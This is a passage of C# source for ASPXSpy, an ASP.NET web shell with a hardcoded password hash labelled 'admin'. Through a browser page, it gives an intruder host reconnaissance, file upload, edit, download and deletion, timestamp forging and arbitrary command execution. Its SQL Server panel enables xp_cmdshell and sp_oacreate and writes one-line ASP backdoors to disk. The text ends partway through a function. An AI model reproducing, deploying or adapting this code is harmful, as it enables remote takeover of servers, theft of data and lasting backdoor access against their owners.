<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false"  %>
<%@ import Namespace="System.IO" %>
<%@ import Namespace="System.Diagnostics" %>
<%@ import Namespace="System.Data" %>
<%@ import Namespace="System.Data.OleDb" %>
<%@ import Namespace="Microsoft.Win32" %>
<%@ import Namespace="System.Net.Sockets" %>
<%@ Assembly Name="System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>
<%@ import Namespace="System.DirectoryServices" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
    public string Password = "21232f297a57a5a743894a0e4a801fc3";//PASS:admin
    public string SessionName = "ASPXSpy";
    public string Bin_Action = "";
    public string Bin_Request = "";
    protected OleDbConnection conn = new OleDbConnection();
    protected OleDbCommand comm = new OleDbCommand();
    
    protected void Page_Load(object sender, EventArgs e)
    {
        
        if (Session[SessionName] != "BIN")
        {
            Bin_login();
        }
        else
        {
            if (!IsPostBack)
            {
                Bin_main();
            }
            else 
            {
              
                  Bin_Action = Request["goaction"];
              if (Bin_Action == "del")
              {
                  Bin_Request = Request["todo"];
                  Bin_Filedel(Bin_Request, 1);
              }
              if (Bin_Action == "change") 
              {
                  Bin_Request = Request["todo"];
                  Bin_FileList(Bin_Request);
              }
              if (Bin_Action == "deldir")
              {
                  Bin_Request = Request["todo"];
                  Bin_Filedel(Bin_Request, 2);
              }
              if (Bin_Action == "down")
              {
                  Bin_Request = Request["todo"];
                  Bin_Filedown(Bin_Request);
              }
              if (Bin_Action == "rename")
              {
                  Bin_Request = Request["todo"];
                  Bin_FileRN(Bin_Request, 1);
              }
              if (Bin_Action == "renamedir")
              {
                  Bin_Request = Request["todo"];
                  Bin_FileRN(Bin_Request, 2);
              }
              if (Bin_Action == "showatt")
              {
                  Bin_Request = Request["todo"];
                  Bin_Fileatt(Bin_Request);
              }
              if (Bin_Action == "edit")
              {
                  Bin_Request = Request["todo"];
                  Bin_FileEdit(Bin_Request);
              }
              if (Bin_Action == "postdata")
              {
                  
                  Bin_Request = Request["todo"];
                  Session["Bin_Table"] = Bin_Request;
                  Bin_DataGrid.CurrentPageIndex = 0;
                  Bin_DBstrTextBox.Text = "";
                  Bin_Databind();
              }
              if (Bin_Action == "changedata")
              {
                  Session["Bin_Table"] = null;
                  Bin_Request = Request["todo"];
                  Session["Bin_Option"] = Request["intext"];
                  Bin_Change();
                  Bin_DBinfoLabel.Visible = false;
                  Bin_DBstrTextBox.Text = Bin_Request;
                  
              }
              if (Session["Bin_Table"] != null)
              {
                  Bin_Databind();
              }
                  
            } 
        }
    }
    public void Bin_login() 
    {
        Bin_LoginPanel.Visible = true;
        Bin_MainPanel.Visible = false;
        Bin_MenuPanel.Visible = false;
        Bin_FilePanel.Visible = false;
        Bin_CmdPanel.Visible = false;
        Bin_SQLPanel.Visible = false;
        Bin_SuPanel.Visible = false;
        Bin_IISPanel.Visible = false;
        Bin_PortPanel.Visible = false;
        Bin_RegPanel.Visible = false;
    }
    public void Bin_main()
    {
        TimeLabel.Text = DateTime.Now.ToString();
        Bin_PortPanel.Visible = false;
        Bin_RegPanel.Visible = false;
        Bin_LoginPanel.Visible = false;
        Bin_MainPanel.Visible = true;
        Bin_MenuPanel.Visible = true;
        Bin_FilePanel.Visible = false;
        Bin_CmdPanel.Visible = false;
        Bin_SQLPanel.Visible = false;
        Bin_SuPanel.Visible = false;
        Bin_IISPanel.Visible = false;
        string ServerIP = "Server IP : "+Request.ServerVariables["LOCAL_ADDR"]+"<br>";
        string HostName = "HostName : " + Environment.MachineName + "<br>";
        string OS = "OS Version : " + Environment.OSVersion + "</br>";
        string IISversion = "IIS Version : " + Request.ServerVariables["SERVER_SOFTWARE"] + "<br>";
        string PATH_INFO = "PATH_TRANSLATED : " + Request.ServerVariables["PATH_TRANSLATED"] + "<br>";
        InfoLabel.Text = "<hr><center><b><U>SYS-INFO</U></B></center>";
        InfoLabel.Text += ServerIP + HostName + OS + IISversion + PATH_INFO + "<hr>";
        InfoLabel.Text += Bin_Process() + "<hr>";
        
    }
    private bool CheckIsNumber(string sSrc)
    {
        System.Text.RegularExpressions.Regex reg = new System.Text.RegularExpressions.Regex(@"^0|[0-9]*[1-9][0-9]*$");

        if (reg.IsMatch(sSrc))
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    public string Bin_iisinfo() 
    {
        string iisinfo = "";
        string iisstart = "";
        string iisend = "";
        string iisstr = "IIS://localhost/W3SVC";
        int i = 0;
        try
        {
            DirectoryEntry mydir = new DirectoryEntry(iisstr);
            iisstart = "<input type=hidden name=goaction><input type=hidden name=todo><TABLE width=100% align=center border=0><TR align=center><TD width=6%><B>Order</B></TD><TD width=20%><B>IIS_USER</B></TD><TD width=25%><B>Domain</B></TD><TD width=30%><B>Path</B></TD></TR>";
            foreach (DirectoryEntry child in mydir.Children)
            {
                if (CheckIsNumber(child.Name.ToString()))
                {
                    string dirstr = child.Name.ToString();
                    string tmpstr = "";
                    DirectoryEntry newdir = new DirectoryEntry(iisstr + "/" + dirstr);
                    DirectoryEntry newdir1 = newdir.Children.Find("root", "IIsWebVirtualDir");
                    iisinfo += "<TR><TD align=center>" + (i = i + 1) + "</TD>";
                    iisinfo += "<TD align=center>" + newdir1.Properties["AnonymousUserName"].Value + "</TD>";
                    iisinfo += "<TD>" + child.Properties["ServerBindings"][0] + "</TD>";
                    iisinfo += "<TD><a href=javascript:Command('change','" + formatpath(newdir1.Properties["Path"].Value.ToString()) + "');>" + newdir1.Properties["Path"].Value + "</a></TD>";
                    iisinfo += "</TR>";
                }
            }
            iisend = "</TABLE><hr>";
        }
        catch (Exception error)
        {
            Bin_Error(error.Message);
        }
          return iisstart + iisinfo + iisend;
    }
    public string Bin_Process()
    {
        string htmlstr = "<center><b><U>PROCESS-INFO</U></B></center><TABLE width=80% align=center border=0><TR align=center><TD width=20%><B>ID</B></TD><TD align=left width=20%><B>Process</B></TD><TD align=left width=20%><B>MemorySize</B></TD><TD align=center width=10%><B>Threads</B></TD></TR>";
            string prostr = "";
            string htmlend = "</TR></TABLE>";
            try
            {
                Process[] myprocess = Process.GetProcesses();
                foreach (Process p in myprocess)
                {
                    prostr += "<TR><TD align=center>" + p.Id.ToString() + "</TD>";
                    prostr += "<TD align=left>" + p.ProcessName.ToString() + "</TD>";
                    prostr += "<TD align=left>" + p.WorkingSet.ToString() + "</TD>";
                    prostr += "<TD align=center>" + p.Threads.Count.ToString() + "</TD>";
                }
            }
            catch (Exception Error)
            {
                Bin_Error(Error.Message);
            }
        return htmlstr + prostr + htmlend;
    }
    protected void LoginButton_Click(object sender, EventArgs e)
    {
        string MD5Pass = FormsAuthentication.HashPasswordForStoringInConfigFile(passtext.Text,"MD5").ToLower();
        if (MD5Pass == Password)
        {
            Session[SessionName] = "BIN";
            Bin_main();
        }
        else
        {
            Bin_login();
        } 
    }

    protected void LogoutButton_Click(object sender, EventArgs e)
    {
        Session.Abandon();
        Bin_login();
    }

    protected void FileButton_Click(object sender, EventArgs e)
    {
        Bin_LoginPanel.Visible = false;
        Bin_MenuPanel.Visible = true;
        Bin_MainPanel.Visible = false;
        Bin_FilePanel.Visible = true;
        Bin_CmdPanel.Visible = false;
        Bin_SQLPanel.Visible = false;
        Bin_SuPanel.Visible = false;
        Bin_IISPanel.Visible = false;
        Bin_PortPanel.Visible = false;
        Bin_RegPanel.Visible = false;
        Bin_upTextBox.Text = formatpath(Server.MapPath("."));
        Bin_CopyTextBox.Text = formatpath(Server.MapPath("."));
        Bin_upTextBox.Text = formatpath(Server.MapPath("."));
        Bin_FileList(Server.MapPath("."));
       
    }

    protected void MainButton_Click(object sender, EventArgs e)
    {
        Bin_main();
    }
    public void Bin_DriveList() 
    {
        string file = "<input type=hidden name=goaction><input type=hidden name=todo>";
        file += "<hr>Drives : ";
        string[] drivers = Directory.GetLogicalDrives();
        for (int i = 0; i < drivers.Length; i++)
        {
            file += "<a href=javascript:Command('change','" + formatpath(drivers[i]) + "');>" + drivers[i] + "</a>&nbsp;";
        }
        file += "    WebRoot :  <a href=javascript:Command('change','" + formatpath(Server.MapPath(".")) + "');>" + Server.MapPath(".") + "</a>";
        Bin_FileLabel.Text = file;
    }

    public void Bin_FileList(string Bin_path)
    {
        Bin_FilePanel.Visible = true;
        Bin_CreateTextBox.Text = "";
        Bin_CopytoTextBox.Text = "";
        Bin_CopyTextBox.Text = Bin_path;
        Bin_upTextBox.Text = Bin_path;
        Bin_IISPanel.Visible = false;
        Bin_DriveList();
        string tmpstr="";
        string Bin_Filelist = Bin_FilelistLabel.Text;
        Bin_Filelist = "<hr>";
        Bin_Filelist += "<table width=90% border=0 align=center>";
        Bin_Filelist += "<tr><td width=40%><b>Name</b></td><td width=15%><b>Size(Byte)</b></td>";
        Bin_Filelist += "<td width=25%><b>ModifyTime</b></td><td width=25%><b>Operate</b></td></tr>";
        try
        {
            Bin_Filelist += "<tr><td>";
            string parstr = "";
            if (Bin_path.Length < 4)
            {
                parstr = formatpath(Bin_path);
              
            }
            else 
            {
                parstr =  formatpath(Directory.GetParent(Bin_path).ToString());
              
            }
            Bin_Filelist += "<i><b><a href=javascript:Command('change','" + parstr + "');>|Parent Directory|</a></b></i>";
            Bin_Filelist += "</td></tr>";
            
            DirectoryInfo Bin_dir = new DirectoryInfo(Bin_path);
            foreach (DirectoryInfo Bin_folder in Bin_dir.GetDirectories())
            {
                string foldername = formatpath(Bin_path) + "/" + formatfile(Bin_folder.Name);
                tmpstr += "<tr>";
                tmpstr += "<td><a href=javascript:Command('change','" + foldername + "')>" + Bin_folder.Name + "</a></td><td><b><i>&lt;dir&gt;</i></b></td><td>" + Directory.GetLastWriteTime(Bin_path + "/" + Bin_folder.Name) + "</td><td><a href=javascript:Command('renamedir','" + foldername + "');>Ren</a>|<a href=javascript:Command('showatt','" + foldername + "/');>Att</a>|<a href=javascript:Command('deldir','" + foldername + "');>Del</a></td>";
                tmpstr += "</tr>";
            }
            foreach (FileInfo Bin_file in Bin_dir.GetFiles())
            {
                string filename = formatpath(Bin_path) + "/" + formatfile(Bin_file.Name);
                tmpstr += "<tr>";
                tmpstr += "<td>" + Bin_file.Name + "</td><td>" + Bin_file.Length + "</td><td>" + Directory.GetLastWriteTime(Bin_path + "/" + Bin_file.Name) + "</td><td><a href=javascript:Command('edit','" + filename + "');>Edit</a>|<a href=javascript:Command('rename','" + filename + "');>Ren</a>|<a href=javascript:Command('down','" + filename + "');>Down</a>|<a href=javascript:Command('showatt','" + filename + "');>Att</a>|<a href=javascript:Command('del','" + filename + "');>Del</a></td>";
                tmpstr += "</tr>";
            }
            tmpstr += "</talbe>";
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message);

        }

        Bin_FilelistLabel.Text = Bin_Filelist + tmpstr;
    }
    public void Bin_Filedel(string instr,int type)
    {
        try
        {
            if (type == 1)
            {
                File.Delete(instr);
            }
            if (type == 2)
            {
                foreach (string tmp in Directory.GetFileSystemEntries(instr))
                {
                    if (File.Exists(tmp))
                    {
                        File.Delete(tmp);
                    }
                    else
                    {
                        Bin_Filedel(tmp, 2);
                    }  
                }
                Directory.Delete(instr);  
            }
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message);
        }
        Bin_FileList(Bin_upTextBox.Text); 
    }
    public void Bin_FileRN(string instr,int type) 
    {
        try
        {
            if (type == 1)
            {
                string[] array = instr.Split(',');

                File.Move(array[0], array[1]);
            }
            if (type == 2)
            {
                string[] array = instr.Split(',');
                Directory.Move(array[0], array[1]);
            }
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message);
        }
        Bin_FileList(Bin_upTextBox.Text);
    }
    public void Bin_Filedown(string instr) 
    {
        try
        {
            FileStream MyFileStream = new FileStream(instr, FileMode.Open, FileAccess.Read, FileShare.Read);
            long FileSize = MyFileStream.Length;
            byte[] Buffer = new byte[(int)FileSize];
            MyFileStream.Read(Buffer, 0, (int)FileSize);
            MyFileStream.Close();
            Response.AddHeader("Content-Disposition", "attachment;filename=" + instr);
            Response.Charset = "UTF-8";
            Response.ContentType = "application/octet-stream";
            Response.BinaryWrite(Buffer);
            Response.Flush();
            Response.End();
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message); 
        }
        
    }
    public void Bin_Fileatt(string instr)
    {
        Bin_AttPanel.Visible = true;
        Bin_FilePanel.Visible = true;
        try
        {
            string Att = File.GetAttributes(instr).ToString();
            Bin_ReadOnlyCheckBox.Checked = false;
            Bin_SystemCheckBox.Checked = false;
            Bin_HiddenCheckBox.Checked = false;
            Bin_ArchiveCheckBox.Checked = false;

            if (Att.LastIndexOf("ReadOnly") != -1)
            {
                Bin_ReadOnlyCheckBox.Checked = true;
            }
            if (Att.LastIndexOf("System") != -1)
            {
                Bin_SystemCheckBox.Checked = true;
            }
            if (Att.LastIndexOf("Hidden") != -1)
            {
                Bin_HiddenCheckBox.Checked = true;
            }
            if (Att.LastIndexOf("Archive") != -1)
            {
                Bin_ArchiveCheckBox.Checked = true;
            }
            Bin_CreationTimeTextBox.Text = File.GetCreationTime(instr).ToString();
            Bin_LastWriteTimeTextBox.Text = File.GetLastWriteTime(instr).ToString();
            Bin_AccessTimeTextBox.Text = File.GetLastAccessTime(instr).ToString();
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message);
        }
        Bin_AttLabel.Text = instr;
        Session["FileName"] = instr;
        Bin_DriveList();
    }
    public void Bin_FileEdit(string instr)
    {
        Bin_FilePanel.Visible = true;
        Bin_EditPanel.Visible = true;
        Bin_DriveList();
        Bin_EditpathTextBox.Text = instr;
        StreamReader SR = new StreamReader(instr, Encoding.Default);
        Bin_EditTextBox.Text = SR.ReadToEnd();
        SR.Close();
    }
    protected void Bin_upButton_Click(object sender, EventArgs e)
    {
       
            string uppath = Bin_upTextBox.Text;
            if (uppath.Substring(uppath.Length - 1, 1) != @"/")
            {
                uppath = uppath + @"/";
            }
            try
            {
                Bin_UpFile.PostedFile.SaveAs(uppath + Path.GetFileName(Bin_UpFile.Value));
                
            }
            catch (Exception error)
            {
                Bin_Error(error.Message);
            }
            Bin_FileList(uppath);
    }
    public void Bin_Error(string error)
    {
        Bin_ErrorLabel.Text = "Error : " + error;
    }
    public string formatpath(string instr)
    {
        instr = instr.Replace(@"\", "/");
        if (instr.Length < 4)
        {
            instr = instr.Replace(@"/", "");
        }
        if (instr.Length == 2)
        {
            instr = instr + @"/";
        }
        instr = instr.Replace(" ", "%20");
        return instr;
    }
    public string formatfile(string instr)
    {
        instr = instr.Replace(" ", "%20");
        return instr;
      
    }
    protected void Bin_GoButton_Click(object sender, EventArgs e)
    {
        Bin_FileList(Bin_upTextBox.Text);
    }

    protected void Bin_NewFileButton_Click(object sender, EventArgs e)
    {
        string newfile = Bin_CreateTextBox.Text;
        string filepath = Bin_upTextBox.Text;
        filepath = filepath + "/" + newfile;
        try
        {
            StreamWriter sw = new StreamWriter(filepath, true, Encoding.Default);
            
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message);
        }
        Bin_FileList(Bin_upTextBox.Text);
    }

    protected void Bin_NewdirButton_Click(object sender, EventArgs e)
    {
        string dirpath = Bin_upTextBox.Text;
        string newdir = Bin_CreateTextBox.Text;
        newdir = dirpath + "/" + newdir;
        try
        {
            Directory.CreateDirectory(newdir);
           
        }
        catch(Exception Error)
        {
            Bin_Error(Error.Message);
        }
        Bin_FileList(Bin_upTextBox.Text);
    }

    protected void Bin_CopyButton_Click(object sender, EventArgs e)
    {
        string copystr = Bin_CopyTextBox.Text;
        string copyto = Bin_CopytoTextBox.Text;
        try
        {
            File.Copy(copystr, copyto);
        }
        catch (Exception Error)
        {
             Bin_Error(Error.Message);
        }
        Bin_CopytoTextBox.Text = "";
        Bin_FileList(Bin_upTextBox.Text);
    }

    protected void Bin_CutButton_Click(object sender, EventArgs e)
    {
        string copystr = Bin_CopyTextBox.Text;
        string copyto = Bin_CopytoTextBox.Text;
        try
        {
            File.Move(copystr, copyto);
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message);
        }
        Bin_CopytoTextBox.Text = "";
        Bin_FileList(Bin_upTextBox.Text);
    }

    protected void Bin_SetButton_Click(object sender, EventArgs e)
    {
        try
        {
            string FileName = Session["FileName"].ToString();
            File.SetAttributes(FileName, FileAttributes.Normal);
            if (Bin_ReadOnlyCheckBox.Checked)
            {
                File.SetAttributes(FileName, FileAttributes.ReadOnly);
            }

            if (Bin_SystemCheckBox.Checked)
            {
                File.SetAttributes(FileName, File.GetAttributes(FileName) | FileAttributes.System);
            }
            if (Bin_HiddenCheckBox.Checked)
            {
                File.SetAttributes(FileName, File.GetAttributes(FileName) | FileAttributes.Hidden);
            }
            if (Bin_ArchiveCheckBox.Checked)
            {
                File.SetAttributes(FileName, File.GetAttributes(FileName) | FileAttributes.Archive);
            }
            if (FileName.Substring(FileName.Length - 1, 1) == "/")
            {
                Directory.SetCreationTime(FileName, Convert.ToDateTime(Bin_CreationTimeTextBox.Text));
                Directory.SetLastWriteTime(FileName, Convert.ToDateTime(Bin_LastWriteTimeTextBox.Text));
                Directory.SetLastAccessTime(FileName, Convert.ToDateTime(Bin_AccessTimeTextBox.Text));
            }
            else
            {
                File.SetCreationTime(FileName, Convert.ToDateTime(Bin_CreationTimeTextBox.Text));
                File.SetLastWriteTime(FileName, Convert.ToDateTime(Bin_LastWriteTimeTextBox.Text));
                File.SetLastAccessTime(FileName, Convert.ToDateTime(Bin_AccessTimeTextBox.Text));
            }
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message);
        }
        Bin_FileList(Bin_upTextBox.Text);
        Response.Write("<script>alert('Success!')</sc" + "ript>");
    }

    protected void Bin_EditButton_Click(object sender, EventArgs e)
    {
        try
        {
            StreamWriter SW = new StreamWriter(Bin_EditpathTextBox.Text, false, Encoding.Default);
            SW.Write(Bin_EditTextBox.Text);
            SW.Close();
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message); 
        }
        Bin_FileList(Bin_upTextBox.Text);
        Response.Write("<script>alert('Success!')</sc" + "ript>");
        
    }
    
    protected void Bin_BackButton_Click(object sender, EventArgs e)
    {
        Bin_FileList(Bin_upTextBox.Text);
    }

    protected void Bin_SbackButton_Click(object sender, EventArgs e)
    {
        Bin_FileList(Bin_upTextBox.Text);
    }

    protected void Bin_CmdButton_Click(object sender, EventArgs e)
    {
        Bin_MenuPanel.Visible = true;
        Bin_LoginPanel.Visible = false;
        Bin_CmdPanel.Visible = true;
        Bin_SQLPanel.Visible = false;
        Bin_CmdLabel.Text = "";
        Bin_SuPanel.Visible = false;
        Bin_IISPanel.Visible = false;
        Bin_RegPanel.Visible = false;
        Bin_PortPanel.Visible = false;
    }

    protected void Bin_RunButton_Click(object sender, EventArgs e)
    {
        try
        {
            Process Cmdpro = new Process();
            Cmdpro.StartInfo.FileName = Bin_CmdPathTextBox.Text;
            Cmdpro.StartInfo.Arguments = Bin_CmdShellTextBox.Text;
            Cmdpro.StartInfo.UseShellExecute = false;
            Cmdpro.StartInfo.RedirectStandardInput = true;
            Cmdpro.StartInfo.RedirectStandardOutput = true;
            Cmdpro.StartInfo.RedirectStandardError = true;
            Cmdpro.Start();
            string cmdstr = Cmdpro.StandardOutput.ReadToEnd();
            cmdstr = cmdstr.Replace("<", "&lt;");
            cmdstr = cmdstr.Replace(">", "&gt;");
            Bin_CmdLabel.Text = "<hr><div id=\"cmd\"><pre>" + cmdstr + "</pre></div>";
        }
        catch (Exception Error)
        {
            Bin_Error(Error.Message); 
        }  
    }

    protected void Bin_SQLButton_Click(object sender, EventArgs e)
    {
        Bin_CmdPanel.Visible = false;
        Bin_SQLPanel.Visible = true;
        Bin_LoginPanel.Visible = false;
        Bin_MenuPanel.Visible = true;
        Bin_AccPanel.Visible = false;
        Bin_Scroll.Visible = false;
        Bin_DBmenuPanel.Visible = false;
        Bin_dirPanel.Visible = false;
        Bin_SuPanel.Visible = false;
        Bin_IISPanel.Visible = false;
        Bin_PortPanel.Visible = false;
        Bin_RegPanel.Visible =false;
    }

    protected void Bin_SQLRadioButton_CheckedChanged(object sender, EventArgs e)
    {
        Session["Bin_Table"] = null;
        Bin_SQLconnTextBox.Text = "server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB";
        Bin_SQLRadioButton.Checked = true;
        Bin_AccRadioButton.Checked = false;
        Bin_AccPanel.Visible = false;
        Bin_DataGrid.Visible = false;
        Bin_Scroll.Visible = false;
        Bin_DBmenuPanel.Visible = false;
        Bin_dirPanel.Visible = false;
    }

    protected void Bin_AccRadioButton_CheckedChanged(object sender, EventArgs e)
    {
        Session["Bin_Table"] = null;
        Bin_SQLconnTextBox.Text = @"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\wwwroot\database.mdb";
        Bin_SQLRadioButton.Checked = false;
        Bin_AccRadioButton.Checked = true;
        Bin_DBmenuPanel.Visible = false;
        Bin_AccPanel.Visible = false;
        Bin_DataGrid.Visible = false;
        Bin_Scroll.Visible = false;
        Bin_dirPanel.Visible = false;
      
    }
    protected void OpenConnection() 
    {
        if (conn.State == ConnectionState.Closed)
        {
            try
            {
                conn.ConnectionString = Bin_SQLconnTextBox.Text;
                comm.Connection = conn;
                conn.Open();
            }
            catch (Exception Error)
            {
                Bin_Error(Error.Message);
            }
        }
    }
    protected void CloseConnection()
    {
        if (conn.State == ConnectionState.Open)
            conn.Close();
            conn.Dispose();
            comm.Dispose();
    }
    public DataTable Bin_DataTable(string sqlstr)
    {
        OleDbDataAdapter da = new OleDbDataAdapter();
        DataTable datatable = new DataTable();
        try
        {
            OpenConnection();
            comm.CommandType = CommandType.Text;
            comm.CommandText = sqlstr;
            da.SelectCommand = comm;
            da.Fill(datatable);
        }
        catch (Exception)
        {
        }
        finally
        {
            CloseConnection();
        }
        return datatable;
    }
    protected void SQL_SumbitButton_Click(object sender, EventArgs e)
    {
        try
        {
            Session["Bin_Table"] = null;
            Bin_DataGrid.CurrentPageIndex = 0;
            Bin_DataGrid.AllowPaging = true;
            if (Bin_SQLRadioButton.Checked)
            {
                Bin_DBmenuPanel.Visible = true;
                Bin_DBinfoLabel.Visible = true;
                Bin_AccPanel.Visible = false;
                Bin_Scroll.Visible = false;
                Bin_dirPanel.Visible = false;
                OpenConnection();
                DataTable ver = Bin_DataTable(@"SELECT @@VERSION");
                DataTable dbs = Bin_DataTable(@"SELECT name FROM master.dbo.sysdatabases");
                DataTable cdb = Bin_DataTable(@"SELECT DB_NAME()");
                DataTable rol = Bin_DataTable(@"SELECT IS_SRVROLEMEMBER('sysadmin')");
                DataTable owner = Bin_DataTable(@"SELECT IS_MEMBER('db_owner')");
                string dbo = "";
                if (owner.Rows[0][0].ToString() == "1")
                {
                    dbo = "db_owner";
                }
                else
                {
                    dbo = "public";
                }
                if (rol.Rows[0][0].ToString() == "1")
                {
                    dbo = "<font color=blue>sa</font>";
                }
                string db_info = "";
                db_info = "<i><b><font color=red>SQLversion</font> : </b></i>" + ver.Rows[0][0].ToString() + "<br><hr>";
                string db_name = "";
                for (int i = 0; i < dbs.Rows.Count; i++)
                {
                    db_name += dbs.Rows[i][0].ToString().Replace(cdb.Rows[0][0].ToString(), "<font color=blue>" + cdb.Rows[0][0].ToString() + "</font>") + "&nbsp;|&nbsp;";
                }
                db_info += "<i><b><font color=red>DataBase</font> : </b></i><div style=\"width:760px;word-break:break-all\">" + db_name + "<br><div><hr>";
                db_info += "<i><b><font color=red>SRVROLEMEMBER</font></i></b> : " + dbo + "<hr>";
                Bin_DBinfoLabel.Text = db_info;
            }
            if (Bin_AccRadioButton.Checked)
            {
                Bin_DataGrid.Visible = false;
                Bin_SAexecButton.Visible = false;
                Bin_Accbind();
            }
        }
        catch (Exception E)
        {
            Bin_Error(E.Message);
        }
    }
    protected void Bin_Accbind() 
    {
        try
        {
            Bin_DBmenuPanel.Visible = false;
            Bin_AccPanel.Visible = true;
            OpenConnection();
            DataTable acctable = new DataTable();
            acctable = conn.GetOleDbSchemaTable(OleDbSchemaGuid.Tables, new Object[] { null, null, null, "Table" });
            string accstr = "<input type=hidden name=goaction><input type=hidden name=todo>";
            accstr += "Tables Count : " + acctable.Rows.Count + "<br>Please select a database : <SELECT onchange=if(this.value!='')Command('postdata',this);>";
            for (int i = 0; i < acctable.Rows.Count; i++)
            {
                accstr += "<option value=" + acctable.Rows[i].ItemArray[2].ToString() + ">" + acctable.Rows[i].ItemArray[2].ToString() + "</option>";
            }
            if (Session["Bin_Table"] != null)
            {
                accstr += "<option SELECTED>" + Session["Bin_Table"] + "</option>";
            }
            accstr += "</SELECT>";
            Bin_AccinfoLabel.Text = accstr;
            CloseConnection();
        }
        catch (Exception Error) 
        {
            Bin_Error(Error.Message);
        }
    }
    protected void Bin_Databind() 
    {
        try
        {
            Bin_SAexecButton.Visible = false;
            Bin_Accbind();
            Bin_Scroll.Visible = true;
            if (Bin_SQLRadioButton.Checked)
            {
                Bin_DBmenuPanel.Visible = true;
                Bin_DBinfoLabel.Visible = false;
            }
            Bin_DataGrid.Visible = true;
            DataTable databind = Bin_DataTable(@"SELECT * FROM " + Session["Bin_Table"]);
            Bin_DataGrid.DataSource = databind;
            Bin_DataGrid.DataBind();     
        }
        catch (Exception Error)
        {
            
            Bin_Error(Error.Message);
        }
    }

    public void Bin_ExecSql(string instr) 
    {
        try
        {
            OpenConnection();
            comm.CommandType = CommandType.Text;
            comm.CommandText = instr;
            comm.ExecuteNonQuery();
        }
        catch (Exception e) 
        {
            Bin_Error(e.Message);
        }
    }
    public void Item_DataBound(object sender,DataGridItemEventArgs e)
    {
        
        for (int i = 2; i < e.Item.Cells.Count; i++)
        {
            e.Item.Cells[i].Text = e.Item.Cells[i].Text.Replace("<", "&lt;").Replace(">", "&gt;");
        }
      
    }
   protected void Bin_DBPage(object sender, DataGridPageChangedEventArgs e) 
    {
        Bin_DataGrid.CurrentPageIndex = e.NewPageIndex;
        Bin_Databind();
    }
    public void Item_Command(object sender, DataGridCommandEventArgs e) 
    {
        if (e.CommandName == "Cancel")
        {
            Bin_DataGrid.EditItemIndex = -1;
            Bin_Databind();
        }
    }

    protected void Bin_ExecButton_Click(object sender, EventArgs e)
    {
        try
        {
            
            Bin_Scroll.Visible = true;
            Bin_DataGrid.Visible = true;
            Bin_DataGrid.AllowPaging = true;
            Bin_Accbind();
            if (Bin_SQLRadioButton.Checked)
            {
                Bin_DBmenuPanel.Visible = true;
            }
            string sqlstr = Bin_DBstrTextBox.Text;
            sqlstr = sqlstr.TrimStart().ToLower();
            if (sqlstr.Substring(0, 6) == "select")
            {
                DataTable databind = Bin_DataTable(sqlstr);
                Bin_DataGrid.DataSource = databind;
                Bin_DataGrid.DataBind();
            }
            else 
            {
                Bin_ExecSql(sqlstr);
                Bin_Databind();
            }
        }
        catch(Exception error)
        {
            Bin_Error(error.Message);
        }
    }

    protected void Bin_BDButton_Click(object sender, EventArgs e)
    {
        Bin_DBinfoLabel.Visible = false;
        Bin_Accbind();
        Bin_DBmenuPanel.Visible = true;
        Bin_DataGrid.Visible = false;
        Bin_DataGrid.AllowPaging = true;
        Bin_Scroll.Visible = false;
        Bin_DBstrTextBox.Text = "";
        Bin_SAexecButton.Visible = false;
        Bin_ResLabel.Visible = false;
        Bin_dirPanel.Visible = false;
        
    }
    
    protected void Bin_SACMDButton_Click(object sender, EventArgs e)
    {
        Bin_DBinfoLabel.Visible = false;
        Bin_DataGrid.Visible = false;
        Bin_Scroll.Visible = false;
        Bin_SAexecButton.Visible = true;
        Bin_Change();
        Bin_ExecButton.Visible = false;
        Bin_ResLabel.Visible = false;
        Session["Bin_Option"] = null;
        Bin_dirPanel.Visible = false;
        
    }
    public void Bin_Change() 
    {
        Bin_ExecButton.Visible = false;
        string select = "<input type=hidden name=goaction><input type=hidden name=todo><input type=hidden name=intext><select onchange=if(this.value!='')Command('changedata',this);><option>SQL Server Exec<option value=\"Use master dbcc addextendedproc ('sp_OACreate','odsole70.dll')\">Add sp_oacreate<option value=\"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll')\">Add xp_cmdshell<option value=\"EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;\">Add xp_cmdshell(SQL2005)<option value=\"exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;\">Add sp_oacreate(SQL2005)<option value=\"exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;\">Open Openrowset(SQL2005)<option value=\"Exec master.dbo.xp_cmdshell 'net user'\">XP_cmdshell exec<option value=\"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^> > c:\\1.asp';\">SP_oamethod exec<option value=\"sp_makewebtask @outputfile='d:\\web\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))" + "%" + ">''' \">SP_makewebtask make file";
        if (Session["Bin_Option"] != null)
        {
            select += "<option SELECTED>" + Session["Bin_Option"] + "</option>";
        }
        select += "</select>";
        Bin_AccinfoLabel.Text = select;
        Bin_DataGrid.Visible = false;
        Bin_Scroll.Visible = false;
    }

    protected void Bin_SAexecButton_Click(object sender, EventArgs e)
    {
        try
        {
            Bin_Change();
            Bin_DBinfoLabel.Visible = false;
            Bin_ExecButton.Visible = false;
            Bin_Scroll.Visible = false;
            Bin_DataGrid.Visible = false;
            Bin_DBmenuPanel.Visible = true;
            string sqlstr = Bin_DBstrTextBox.Text;
            DataTable databind = Bin_DataTable(sqlstr);
            string res = "";
